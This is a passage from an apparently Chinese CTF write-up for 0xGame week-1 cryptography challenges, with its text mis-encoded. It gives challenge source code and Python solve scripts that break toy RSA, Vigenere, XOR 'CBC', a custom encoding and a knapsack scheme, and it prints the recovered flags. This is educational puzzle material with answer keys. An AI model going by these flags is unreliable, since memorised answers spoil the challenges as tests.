class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">tmp = getPrime(<span class="number">32</span>)</span><br><span class="line">N *= tmp</span><br><span class="line"><span class="keyword">return</span> N</span><br><span class="line"></span><br><span class="line">mask = getrandbits(<span class="number">256</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = getN()</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m*mask,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;mask = <span class="subst">&#123;mask&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 93099494899964317992000886585964221136368777219322402558083737546844067074234332564205970300159140111778084916162471993849233358306940868232157447540597</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 54352122428332145724828674757308827564883974087400720449151348825082737474080849774814293027988784740602148317713402758353653028988960687525211635107801</span></span><br><span class="line"><span class="string">mask = 54257528450885974256117108479579183871895740052660152544049844968621224899247</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>ç”¨ <a href="http://www.factordb.com/">åœ¨çº¿ç½‘ç«™</a> åˆ†è§£nã€‚</p><p><img src="/0xGame-week1/c_1_1.png"></p><p>å¾—åˆ°pqåå¸¦å…¥å¸¸è§„è„šæœ¬ä¸­è§£å¯†ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">n=<span class="number">93099494899964317992000886585964221136368777219322402558083737546844067074234332564205970300159140111778084916162471993849233358306940868232157447540597</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">pq=[<span class="number">2329990801</span>,<span class="number">2436711469</span>,<span class="number">2732757047</span>,<span class="number">2770441151</span>,<span class="number">2821163021</span>,<span class="number">2864469667</span>,<span class="number">2995527113</span>,<span class="number">3111632101</span>,<span class="number">3162958289</span>,<span class="number">3267547559</span>,<span class="number">3281340371</span>,<span class="number">3479527847</span>,<span class="number">3561068417</span>,<span class="number">3978177241</span>,<span class="number">4134768233</span>,<span class="number">4160088337</span>]</span><br><span class="line">c=<span class="number">54352122428332145724828674757308827564883974087400720449151348825082737474080849774814293027988784740602148317713402758353653028988960687525211635107801</span></span><br><span class="line"></span><br><span class="line">mask = <span class="number">54257528450885974256117108479579183871895740052660152544049844968621224899247</span></span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pq:</span><br><span class="line">    phi*=(i-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m1//mask)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;0xGame&#123;Magic_M@th_Make_Crypt0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h2><p>å¯†æ–‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0dGmqk&#123;79ap4i0522g0a67m6i196he52357q60f&#125; </span><br></pre></td></tr></table></figure><p>æ ¹æ®flagå¤´æ˜¯<code>0xGame</code>ï¼Œåæ¨å‡ºå¯†é’¥æ˜¯<code>game</code>ï¼Œæœ€åæ‰¾ä¸€ä¸ªåœ¨çº¿ç½‘ç«™è§£å¯†å³å¯å¾—åˆ°flagã€‚</p><h2 id="å¯†ç ï¼Œè§…ç ï¼Œå…ˆæœ‰-å†å¯†"><a href="#å¯†ç ï¼Œè§…ç ï¼Œå…ˆæœ‰-å†å¯†" class="headerlink" title="å¯†ç ï¼Œè§…ç ï¼Œå…ˆæœ‰*å†å¯†"></a>å¯†ç ï¼Œè§…ç ï¼Œå…ˆæœ‰*å†å¯†</h2><p>æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag <span class="comment">#ä»ä¸­å¯¼å…¥ç§˜å¯†çš„flagï¼Œè¿™æ˜¯æˆ‘ä»¬è¦ç ´è§£çš„ä¿¡æ¯</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long <span class="comment">#ä»å‡½æ•°åº“å¯¼å…¥ä¸€äº›ç¼–ç å‡½æ•°</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"><span class="comment">#hint:ä¹Ÿè®¸ä¸‹åˆ—å‡½æ•°åº“ä¼šå¯¹ä½ æœ‰äº›å¸®åŠ©ï¼Œä½†æ˜¯è¦æ€ä¹ˆç”¨å‘¢â€¦â€¦</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">flag = flag.encode()</span><br><span class="line">lent = <span class="built_in">len</span>(flag)</span><br><span class="line">flag = [flag[i*(lent//<span class="number">4</span>):(i+<span class="number">1</span>)*(lent//<span class="number">4</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]<span class="comment">#å°†flagåˆ‡å‰²æˆå››ä»½</span></span><br><span class="line"></span><br><span class="line">c1 = bytes_to_long(flag[<span class="number">0</span>])</span><br><span class="line">c2 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">bin</span>(i))[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> flag[<span class="number">1</span>]])</span><br><span class="line">c3 = b64encode(flag[<span class="number">2</span>])</span><br><span class="line">c4 = flag[<span class="number">3</span>].<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1?= <span class="subst">&#123;<span class="built_in">pow</span>(c1,<span class="number">5</span>)&#125;</span>\nc2 = <span class="subst">&#123;c2&#125;</span>\nc3 = <span class="subst">&#123;c3&#125;</span>\nc4 = <span class="subst">&#123;c4&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c1?= 2607076237872456265701394408859286660368327415582106508683648834772020887801353062171214554351749058553609022833985773083200356284531601339221590756213276590896143894954053902973407638214851164171968630602313844022016135428560081844499356672695981757804756591891049233334352061975924028218309004551</span></span><br><span class="line"><span class="string">c2 = 10010000100001101110100010100111101000111110010010111010100001101110010010111111101000011110011010000001101011111110011010011000101011111110010110100110100000101110010010111101100101011110011110111100</span></span><br><span class="line"><span class="string">c3 = b&#x27;lueggeeahO+8jOmCo+S5iOW8gOWni+aIkQ==&#x27;</span></span><br><span class="line"><span class="string">c4 = e4bbace79a8443727970746fe68c91e68898e590a72121217d</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#å…¨æ˜¯ä¹±ç ï¼Œé‚£å’‹åŠå˜›ï¼Ÿ</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®æºç ï¼Œæˆ‘ä»¬è¦å…ˆå°†c1å¼€5æ¬¡æ–¹å†è½¬æˆbytesï¼Œc2ä»¥8ä½é•¿åº¦ä½åŸºå‡†åˆ†å‰²å‡ºå­—ç¬¦ï¼Œc3è¿›è¡Œbase64è§£ç ï¼Œc4è¿›è¡Œhexè§£ç ï¼Œç„¶åæ‹¼æ¥èµ·æ¥å†decodeè§£ç å³å¯å¾—åˆ°flagã€‚</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">c1= <span class="number">2607076237872456265701394408859286660368327415582106508683648834772020887801353062171214554351749058553609022833985773083200356284531601339221590756213276590896143894954053902973407638214851164171968630602313844022016135428560081844499356672695981757804756591891049233334352061975924028218309004551</span></span><br><span class="line">c2 = <span class="string">&quot;10010000100001101110100010100111101000111110010010111010100001101110010010111111101000011110011010000001101011111110011010011000101011111110010110100110100000101110010010111101100101011110011110111100&quot;</span></span><br><span class="line">c3 = <span class="string">b&#x27;lueggeeahO+8jOmCo+S5iOW8gOWni+aIkQ==&#x27;</span></span><br><span class="line">c4 = <span class="string">&quot;e4bbace79a8443727970746fe68c91e68898e590a72121217d&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin_to_hex</span>(<span class="params">c</span>):</span><br><span class="line">    m = <span class="built_in">len</span>(c)//<span class="number">8</span></span><br><span class="line">    flag=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        str1=c[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">        a = <span class="built_in">int</span>(str1,<span class="number">2</span>)</span><br><span class="line">        flag+=<span class="built_in">hex</span>(a)[<span class="number">2</span>:]</span><br><span class="line">        <span class="comment">#print(i,hex(a)[2:])</span></span><br><span class="line">        <span class="comment">#print(i,str1)</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">a2=bin_to_hex(c2)</span><br><span class="line">c11=iroot(c1,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">flag=long_to_bytes(<span class="built_in">int</span>(c11[<span class="number">0</span>]))+<span class="built_in">bytes</span>.fromhex(a2)+b64decode(c3)+<span class="built_in">bytes</span>.fromhex(c4)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h2 id="Whatâ€™s-CBC"><a href="#Whatâ€™s-CBC" class="headerlink" title="Whatâ€™s CBC?"></a>Whatâ€™s CBC?</h2><p>æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_xor</span>(<span class="params">a,b</span>):</span><br><span class="line">a,b=bytes_to_long(a),bytes_to_long(b)</span><br><span class="line"><span class="keyword">return</span> long_to_bytes(a^b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">text</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(text)%<span class="number">8</span>:</span><br><span class="line"><span class="keyword">return</span> text</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">pad = <span class="number">8</span>-(<span class="built_in">len</span>(text)%<span class="number">8</span>)</span><br><span class="line">text += pad.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)*pad</span><br><span class="line"><span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt_CBC</span>(<span class="params">text,iv,key</span>):</span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">text = pad(text)</span><br><span class="line">block=[text[_*<span class="number">8</span>:(_+<span class="number">1</span>)*<span class="number">8</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)//<span class="number">8</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> block:</span><br><span class="line">tmp = bytes_xor(iv,i)</span><br><span class="line">iv = encrypt(tmp,key)</span><br><span class="line">result += iv</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text,key</span>):</span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">result += ((i^key)).to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;11111111&#x27;</span></span><br><span class="line"></span><br><span class="line">enc = (Encrypt_CBC(flag,iv,key))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc = <span class="subst">&#123;enc&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#enc = b&quot;\x8e\xc6\xf9\xdf\xd3\xdb\xc5\x8e8q\x10f&gt;7.5\x81\xcc\xae\x8d\x82\x8f\x92\xd9o&#x27;D6h8.d\xd6\x9a\xfc\xdb\xd3\xd1\x97\x96Q\x1d&#123;\\TV\x10\x11&quot;</span></span><br></pre></td></tr></table></figure><p>åˆ†ææºç ï¼Œå¯ä»¥çŸ¥é“è¿™é‡Œé¢ç¼ºå°‘äº†<code>key</code>ã€‚</p><p><code>Encrypt_CBC</code>æ˜¯å…ˆå°†flagåˆ†æˆé•¿åº¦ä¸º8çš„å¤šä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åå†å•ç‹¬å¤„ç†ã€‚æ¯ä¸€ä¸ªå­—ç¬¦ä¸²å…ˆ<code>bytes_xor(iv,i)</code>ï¼Œå†<code>encrypt(tmp,key)</code>å¹¶æ›´æ–°ivï¼Œæ–°çš„ivæ˜¯åŠ å¯†åçš„å­—ç¬¦ï¼Œæœ€åå†æ‹¼æ¥èµ·æ¥ã€‚</p><p><code>bytes_xor</code>æ˜¯å°†éƒ¨åˆ†<code>flag</code>ä¸<code>iv</code>å¼‚æˆ–ã€‚</p><p><code>encrypt</code>å‡½æ•°æ˜¯å°†<code>text</code>çš„æ¯ä¸€ä½çš„å€¼éƒ½ä¸<code>key</code>å¼‚æˆ–ï¼Œç”±æ­¤æ¨æ–­å‡ºkeyæ˜¯ä¸€ä¸ªæ•°å­—ã€‚</p><p>ä½¿ç”¨flagå¤´<code>0xGame&#123;&#125;</code>å¯ä»¥æ¨æ–­å‡ºkeyä¸º143.</p><p>è§£å¯†è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_xor</span>(<span class="params">a,b</span>):</span><br><span class="line">a,b=bytes_to_long(a),bytes_to_long(b)</span><br><span class="line"><span class="keyword">return</span> long_to_bytes(a^b)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">text,key</span>):</span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        result += ((i^key)).to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_CBC</span>(<span class="params">text,iv,key</span>):</span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#text = pad(text)</span></span><br><span class="line">    block=[text[_*<span class="number">8</span>:(_+<span class="number">1</span>)*<span class="number">8</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)//<span class="number">8</span>)]</span><br><span class="line">    <span class="built_in">print</span>(block)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> block:</span><br><span class="line">        iv1 = decrypt(i,key)</span><br><span class="line">        tmp = bytes_xor(iv,iv1)</span><br><span class="line">        result += tmp</span><br><span class="line">        iv=i</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;11111111&#x27;</span></span><br><span class="line">key=<span class="number">143</span>   </span><br><span class="line">enc = <span class="string">b&quot;\x8e\xc6\xf9\xdf\xd3\xdb\xc5\x8e8q\x10f&gt;7.5\x81\xcc\xae\x8d\x82\x8f\x92\xd9o&#x27;D6h8.d\xd6\x9a\xfc\xdb\xd3\xd1\x97\x96Q\x1d&#123;\\TV\x10\x11&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(enc))</span><br><span class="line">flag = decrypt_CBC(enc,iv,key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;0xGame&#123;098f6bcd4621d373cade4e832627b4f6&#125;\x08\x08\x08\x08\x08\x08\x08\x08&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="çŒœè°œ"><a href="#çŒœè°œ" class="headerlink" title="çŒœè°œ"></a>çŒœè°œ</h2><p>æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">text</span>):</span><br><span class="line">text = text.decode()</span><br><span class="line">code = <span class="string">&#x27;AP3IXYxn4DmwqOlT0Q/JbKFecN8isvE6gWrto+yf7M5d2pjBuk1Hh9aCRZGUVzLS&#x27;</span></span><br><span class="line">unpad = <span class="number">0</span></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (text[-<span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span>) &amp; (text[-<span class="number">2</span>:] != <span class="string">&#x27;==&#x27;</span>):</span><br><span class="line">text = text[:-<span class="number">1</span>]</span><br><span class="line">unpad = -<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> text[-<span class="number">2</span>:] == <span class="string">&#x27;==&#x27;</span>:</span><br><span class="line">text = text[:-<span class="number">2</span>]</span><br><span class="line">unpad = -<span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">tmp += <span class="built_in">str</span>(<span class="built_in">bin</span>(code.index(i)))[<span class="number">2</span>:].zfill(<span class="number">3</span>)</span><br><span class="line">tmp = tmp[:unpad]</span><br><span class="line">result = long_to_bytes(<span class="built_in">int</span>(tmp,<span class="number">2</span>))</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">text</span>):</span><br><span class="line">code = <span class="string">&#x27;AP3IXYxn4DmwqOlT0Q/JbKFecN8isvE6gWrto+yf7M5d2pjBuk1Hh9aCRZGUVzLS&#x27;</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">bin</span>(i))[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> text])</span><br><span class="line">length = <span class="built_in">len</span>(text)</span><br><span class="line">pad = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> length%<span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">text += <span class="string">&#x27;00&#x27;</span></span><br><span class="line">pad = <span class="string">b&#x27;==&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> length%<span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">text += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">pad = <span class="string">b&#x27;=&#x27;</span></span><br><span class="line">result = [code[<span class="built_in">int</span>(text[<span class="number">3</span>*i:<span class="number">3</span>*(i+<span class="number">1</span>)],<span class="number">2</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(text)//<span class="number">3</span>)]</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result).encode()+pad</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">flag</span>):</span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">result += (key[i%<span class="number">7</span>]^(flag[i]+i)).to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = enc(encrypt(flag))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = b&#x27;IPxYIYPYXPAn3nXX3IXA3YIAPn3xAYnYnPIIPAYYIA3nxxInXAYnIPAIxnXYYYIXIIPAXn3XYXIYAA3AXnx=&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å¯†é’¥ï¼Œæ‹¿flagå¤´<code>0xGame&#123;</code>å»æ¨ã€‚</p><p>ç”±<code>(key[i%7]^(flag[i]+i))</code>å¯ä»¥çŸ¥é“<code>key</code>çš„é•¿åº¦æ˜¯7 ã€‚</p><p>æºç è‡ªå¸¦äº†<code>dec</code>çš„æºç ï¼Œä¸ç”¨çº ç»“<code>enc</code>äº†ã€‚</p><p>åˆ†æ<code>encrypt</code>ï¼Œå¯ä»¥çŸ¥é“åŠ å¯†è¿‡ç¨‹æ˜¯<code>ç§»ä½+å¼‚æˆ–</code>ã€‚</p><p>è§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">text</span>):</span><br><span class="line">    text = text.decode()</span><br><span class="line">    code = <span class="string">&#x27;AP3IXYxn4DmwqOlT0Q/JbKFecN8isvE6gWrto+yf7M5d2pjBuk1Hh9aCRZGUVzLS&#x27;</span></span><br><span class="line">    unpad = <span class="number">0</span></span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (text[-<span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span>) &amp; (text[-<span class="number">2</span>:] != <span class="string">&#x27;==&#x27;</span>):</span><br><span class="line">        text = text[:-<span class="number">1</span>]</span><br><span class="line">        unpad = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> text[-<span class="number">2</span>:] == <span class="string">&#x27;==&#x27;</span>:</span><br><span class="line">        text = text[:-<span class="number">2</span>]</span><br><span class="line">        unpad = -<span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        tmp += <span class="built_in">str</span>(<span class="built_in">bin</span>(code.index(i)))[<span class="number">2</span>:].zfill(<span class="number">3</span>)</span><br><span class="line">    tmp = tmp[:unpad]</span><br><span class="line">    result = long_to_bytes(<span class="built_in">int</span>(tmp,<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;IPxYIYPYXPAn3nXX3IXA3YIAPn3xAYnYnPIIPAYYIA3nxxInXAYnIPAIxnXYYYIXIIPAXn3XYXIYAA3AXnx=&#x27;</span></span><br><span class="line">c = dec(c)</span><br><span class="line"><span class="comment">#print(c)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ±‚key</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getkey</span>(<span class="params">flag</span>):</span><br><span class="line">    key=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    result=<span class="string">b&#x27;0xGame&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">        key+=((flag[i]^(result[i]+i))).to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">key = getkey(c)</span><br><span class="line"><span class="comment">#print(key)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">enc</span>):</span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        a = (key[i%<span class="number">7</span>]^(enc[i]))-i</span><br><span class="line">        result += a.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">flag = decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;0xGame&#123;Kn0wn_pl@intext_Att@ck!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Take-my-bag"><a href="#Take-my-bag" class="headerlink" title="Take my bag!"></a>Take my bag!</h2><p>æºç :</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m</span>):</span><br><span class="line">m = <span class="built_in">str</span>(<span class="built_in">bin</span>(m))[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">enc = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">enc += init[i] * <span class="built_in">int</span>(m[i]) % n</span><br><span class="line"><span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line">w = getPrime(<span class="number">64</span>)</span><br><span class="line">n = getPrime(<span class="number">512</span>)</span><br><span class="line">init = [w*<span class="built_in">pow</span>(<span class="number">3</span>, i) % n <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)]</span><br><span class="line"></span><br><span class="line">c = encrypt(bytes_to_long(flag))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;w=<span class="subst">&#123;w&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">w=16221818045491479713</span></span><br><span class="line"><span class="string">n=9702074289348763131102174377899883904548584105641045150269763589431293826913348632496775173099776917930517270317586740686008539085898910110442820776001061</span></span><br><span class="line"><span class="string">c=4795969289572314590787467990865205548430190921556722879891721107719262822789483863742356553249935437004378475661668768893462652103739250038700528111</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>èƒŒåŒ…å¯†ç ã€‚</p><p>å‚è€ƒï¼š</p><ol><li><a href="https://blog.csdn.net/m0_62506844/article/details/125795366">https://blog.csdn.net/m0_62506844/article/details/125795366</a></li><li><a href="https://blog.csdn.net/sorryagain/article/details/125067778">https://blog.csdn.net/sorryagain/article/details/125067778</a></li></ol><p>è§£é¢˜è„šæœ¬ï¼ˆsageï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, bytes_to_long, inverse, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">w=<span class="number">16221818045491479713</span></span><br><span class="line">n=<span class="number">9702074289348763131102174377899883904548584105641045150269763589431293826913348632496775173099776917930517270317586740686008539085898910110442820776001061</span></span><br><span class="line">c=<span class="number">4795969289572314590787467990865205548430190921556722879891721107719262822789483863742356553249935437004378475661668768893462652103739250038700528111</span></span><br><span class="line">pubkey=[w*<span class="built_in">pow</span>(<span class="number">3</span>, i) % n <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span 